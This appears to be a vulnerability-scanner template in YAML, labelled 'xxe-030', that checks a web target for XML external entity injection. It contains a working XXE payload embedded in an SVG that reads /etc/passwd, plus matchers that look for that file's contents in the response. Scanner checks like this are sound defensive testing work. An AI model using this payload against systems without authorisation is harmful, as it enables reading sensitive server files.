id: xxe-030
name: 'XXE via content'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via content'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      content:
        - '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'XXE_OK'
